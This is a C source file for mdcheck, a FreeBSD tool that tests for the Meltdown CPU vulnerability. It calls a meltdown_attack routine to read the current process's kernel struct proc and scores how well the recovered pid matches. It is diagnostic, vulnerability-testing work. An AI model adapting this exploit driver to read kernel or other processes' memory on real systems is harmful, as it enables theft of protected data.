/*-
 * Copyright (c) 2018 The University of Oslo
 * Copyright (c) 2018 Dag-Erling Smørgrav
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#ifdef __FreeBSD__
#include <sys/types.h>

#include <sys/proc.h>
#include <sys/sysctl.h>
#include <sys/time.h>
#include <sys/user.h>
#endif

#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "meltdown.h"

static int quick;

typedef enum {
	MDCHECK_SUCCESS,
	MDCHECK_PARTIAL,
	MDCHECK_FAILED,
	MDCHECK_ERROR,
} mdcheck_result;

/*
 * Attempts to exfiltrate data from the kernel.	 Returns MDCHECK_SUCCESS
 * if completely successful, MDCHECK_PARTIAL if partially successful,
 * MDCHECK_FAILED if unsuccessful, and MDCHECK_ERROR if an error prevented
 * the test from running.
 */
#ifdef __FreeBSD__
static mdcheck_result
mdcheck(void)
{
	int mib[] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, 0 };
	struct kinfo_proc kip;
	struct proc p;
	size_t kiplen;
	unsigned int i, rounds;
	int pid, pidmask;
	int ret;

	ret = MDCHECK_FAILED;
	pid = getpid();
	pidmask = 0xffffffff;
	for (i = 0; i < 4; ++i)
		if (*((uint8_t *)&pid + i) == 0)
			*((uint8_t *)&pidmask + i) = 0;
	VERBOSEF("attempting to read struct proc for pid 0x%08x mask 0x%08x\n",
	    pid, pidmask);
	mib[3] = pid;
	kiplen = sizeof kip;
	memset(&kip, 0, kiplen);
	if (sysctl(mib, 4, &kip, &kiplen, NULL, 0) != 0) {
		warn("sysctl()");
		return (MDCHECK_ERROR);
	}
	for (ret = MDCHECK_FAILED, rounds = 8; rounds <= 512; rounds *= 2) {
		memset(&p, 0, sizeof p);
		if (quick) {
			/* quick mode: read just the pid */
			meltdown_attack(&kip.ki_paddr->p_pid, &p.p_pid,
			    sizeof p.p_pid, rounds);
			if (verbose)
				hexdump(0, &p.p_pid, sizeof p.p_pid);
		} else {
			/* full mode: read our entire struct proc */
			meltdown_attack(kip.ki_paddr, &p, sizeof p, rounds);
			if (verbose)
				hexdump(0, &p, sizeof p);
		}
		/*
		 * Rate our success based on the Hamming distance between
		 * what we got and what we expected.
		 *
		 * TODO: create a portable
		 *   unsigned int hamming(const void *, const void *, size_t);
		 * in util.c, and use pointers to deduplicate the quick
		 * and slow code paths.
		 */
		if (p.p_pid == pid) {
			VERBOSEF("exact match at %u rounds\n", rounds);
			return (MDCHECK_SUCCESS);
		} else if ((p.p_pid & pidmask) == pid) {
			VERBOSEF("imperfect match at %u rounds\n", rounds);
			ret = MDCHECK_PARTIAL;
		} else {
			VERBOSEF("no match with %u rounds (d = %u)\n",
			    rounds, __builtin_popcount(p.p_pid ^ pid));
		}
	}
	return (ret);
}
#else
static int
mdcheck(void)
{

	errx(1, "Unimplemented");
}
#endif

/*
 * Print usage string and exit.
 */
static void
usage(void)
{

	fprintf(stderr, "usage: mdcheck [-v]\n");
	exit(1);
}

int
main(int argc, char *argv[])
{
	int opt, ret;

	while ((opt = getopt(argc, argv, "qv")) != -1)
		switch (opt) {
		case 'q':
			quick++;
			break;
		case 'v':
			verbose++;
			break;
		default:
			usage();
		}

	argc -= optind;
	argv += optind;

	if (argc)
		usage();

	/* create the probe array and ensure that it is paged in */
	meltdown_init();

	/* calibrate our timer */
	meltdown_calibrate();

	/* perform our tests */
	ret = mdcheck();

	exit(ret);
}
